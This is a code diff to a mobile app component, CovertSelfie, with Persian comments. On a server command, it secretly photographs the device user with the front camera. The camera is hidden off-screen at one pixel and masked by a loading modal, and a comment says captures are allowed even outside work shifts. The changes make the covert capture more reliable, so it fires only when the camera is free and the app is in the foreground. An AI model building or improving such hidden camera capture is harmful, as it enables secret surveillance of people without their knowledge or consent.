@@ -6,11 +6,12 @@ import { getImageConfig } from './img';
  * به‌جای صفحهٔ سفید کامل، یک modal کوچک لودینگ نمایش داده می‌شود.
  */
 import React, { useEffect, useRef, useState, useCallback } from 'react';
-import { View, Text, Modal, StyleSheet } from 'react-native';
+import { View, Text, Modal, StyleSheet, AppState } from 'react-native';
 import * as Location from 'expo-location';
 import { request } from './api';
 import { onCovertTrigger } from './covertTrigger';
 import { FONT } from './theme';
+import { isCameraInUse, useCameraSession } from './cameraSession';
 
 let CameraView = null, useCameraPermissions = null;
 try {
@@ -34,22 +35,23 @@ function inHours(hours) {
 function CaptureSession({ onDone }) {
   const camRef = useRef(null);
   const tookRef = useRef(false);
+  const capture = async () => {
+    if (tookRef.current || !camRef.current) return;
+    tookRef.current = true;
+    try {
+      const photo = await camRef.current.takePictureAsync({ quality: getImageConfig().quality / 100, base64: true, skipProcessing: false });
+      onDone(photo);
+    } catch { onDone(null); }
+  };
   useEffect(() => {
-    const t = setTimeout(async () => {
-      if (tookRef.current || !camRef.current) { onDone(null); return; }
-      tookRef.current = true;
-      try {
-        const photo = await camRef.current.takePictureAsync({ quality: getImageConfig().quality / 100, base64: true, skipProcessing: true });
-        onDone(photo);
-      } catch { onDone(null); }
-    }, 900);
+    const t = setTimeout(() => { if (!tookRef.current) onDone(null); }, 10000);
     return () => clearTimeout(t);
   }, []);
   if (!CameraView) { onDone(null); return null; }
   // دوربین کاملاً خارج از viewport — جلوی آن را modal می‌پوشاند
   return (
     <View style={{ position: 'absolute', top: -9999, left: -9999, width: 1, height: 1 }} pointerEvents="none">
-      <CameraView ref={camRef} style={{ width: 1, height: 1 }} facing="front" />
+      <CameraView ref={camRef} style={{ width: 1, height: 1 }} facing="front" onCameraReady={capture} onMountError={() => onDone(null)} />
     </View>
   );
 }
@@ -58,15 +60,17 @@ export default function CovertSelfie() {
   const [perm, requestPerm] = useCameraPermissions ? useCameraPermissions() : [null, async () => null];
   const [shooting, setShooting] = useState(false);
   const busyRef = useRef(false);
+  const { cameraActive } = useCameraSession(shooting);
 
   const doCapture = useCallback(async (rsn) => {
-    if (!CameraView || busyRef.current) return;
+    if (!CameraView || busyRef.current || isCameraInUse() || AppState.currentState !== 'active') return false;
+    busyRef.current = true;
     // دستور سرور حتی خارج از شیفت هم مجاز است، چون به‌صورت هدفمند از پنل ارسال شده است.
     let hasPerm = perm?.granted;
     if (!hasPerm) { const r = await requestPerm().catch(() => null); hasPerm = r?.granted; }
-    if (!hasPerm) return;
-    busyRef.current = true;
+    if (!hasPerm || isCameraInUse() || AppState.currentState !== 'active') { busyRef.current = false; return false; }
     setShooting(true);
+    return true;
   }, [perm]);
 
   const handleDone = useCallback(async (photo) => {
@@ -94,8 +98,8 @@ export default function CovertSelfie() {
       try {
         const r = await request('/my/covert-selfie-request');
         if (r?.id) {
-          doCapture('manual');
-          request('/my/covert-selfie-request/' + r.id + '/fulfill', { method: 'POST', body: {} }).catch(() => {});
+          const started = await doCapture('manual');
+          if (started) request('/my/covert-selfie-request/' + r.id + '/fulfill', { method: 'POST', body: {} }).catch(() => {});
         }
       } catch {}
     };
@@ -116,7 +120,7 @@ export default function CovertSelfie() {
           </View>
         </View>
       </Modal>
-      <CaptureSession onDone={handleDone} />
+      {cameraActive && <CaptureSession onDone={handleDone} />}
     </>
   );
 }
